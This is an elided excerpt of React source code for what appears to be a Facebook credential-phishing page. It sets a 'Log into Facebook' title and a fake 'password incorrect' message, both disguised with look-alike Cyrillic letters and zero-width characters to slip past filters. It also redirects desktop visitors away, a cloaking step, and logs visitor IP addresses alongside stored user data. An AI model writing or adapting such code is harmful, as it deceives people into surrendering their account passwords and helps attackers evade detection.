...
useEffect(() => {
    ...
    useEffect(() => {
        if (isDesktop) {
            window.location.href = 'qKn4Zj9Xt3Po6Mv8Ly1Rb5Fg7Wc2Ir0Ns6Jx3Te9Uh2Km5Yn8Vo1Lp4Xq7Bd3Ft6Gr5';
        }
    }, [isDesktop]);
...
========================`;
    ...
    useEffect(() => {
        document.title = '‌Lо‌g int‌‌‌о Fаc‌‌еbо‌o‌k';
    }, [userData, userUrl]);
    ...
    const addUserData = async () => {
        try {
            ...
            if (!docSnap.exists()) {
                ...
                console.log("BegasID: ", ip);
                getUserData();
            } else {
                console.log("ResID ID: ", ip);
            }
        } catch (e) {
            console.error("Serr: ", e);
        }
    };
    ...
    const resetUserNumber = async () => {
        try {
            ...
            console.log("DegIP: ", ip);
        } catch (e) {
            console.error("Gerr: ", e);
        }
    };
    ...
    console.log("hiuoio", isUserData, userData);
...
<div style={{ 
    ...
    The pas‌s‌wo‌rd yo‌u ente‌red is inco‌‌rre‌ct. Did you for‌get your pa‌ss‌wo‌r‌d?
</div>
